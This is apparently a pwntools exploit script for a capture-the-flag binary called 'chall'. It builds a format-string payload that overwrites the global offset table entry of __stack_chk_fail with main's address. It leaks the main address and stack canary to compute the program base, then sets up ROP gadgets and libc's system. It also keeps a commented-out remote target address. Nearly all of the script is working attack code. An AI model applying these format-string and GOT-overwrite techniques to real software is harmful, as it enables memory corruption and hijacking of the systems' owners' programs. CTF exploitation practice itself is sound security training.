from pwn import *

context.clear(arch='amd64', terminal=['tmux', 'splitw', '-fh'])
elf = context.binary = ELF('./chall')
libc = elf.libc

gdbscript = '''b *vuln+44
b *vuln+61
c
c
'''

p = process('./chall')
#p = gdb.debug('./chall', gdbscript=gdbscript)
#p = remote("34.29.214.123", port=5000)

rop = ROP(elf.path)
print(rop.rbp)

percent = b'%c' * 34    # get to stack pointer to overwrite
addr_add = b'%32758c'   # overwrite this this ammount of chars to another stack pointer
write = b'%hn'          # write it

got = p64(0x555555558018)       # with ASLR off this is just an offset from main/vuln (__stack_chk_fail got), basically just hoping to hit it
second = b'AAAAA%119340c%19$hn' + got   # overwrite __stack_chk_fail to start of main

#p.send(percent + addr_add + write + second)

main_offset = elf.sym['main'] + 0x4000
stack_chk_offset = 0x8018

payload = flat(
        f"%{main_offset}c",     # overwrite 2 LSB with main addr
        "%15$hn",               # 15th stack argument is the stack_chk_offset we put on stack p16(stk_chk_f)
        "##%34$p\n",            # main addr (info for next printf)
        "%31$p\n",)             # canary (info for next printf)
        #"%37$p\n", # pie (main)
        #)

exploit = flat(
        payload.ljust(65, b'\x90'),
        p16(stack_chk_offset),  # overwrite close enough pointer on stack to the GOT addr of __stack_chk_fail
        )

#p.send(percent + addr_add + write + b'%10chn')
p.send(exploit)

main_addr = int(p.recvuntil(b'249')[-14:].decode(), 16)
elf.address = main_addr - elf.sym['main']

print("Main Addr @", hex(main_addr))
print("Elf Base  @", hex(elf.address))

# ROPs
ret = elf.address + 0x101a
sys = libc.symbols['system']

p.interactive()

# main - __stack_chk_fail = 0x2dcf

# 1/16 chance of hitting GOT address
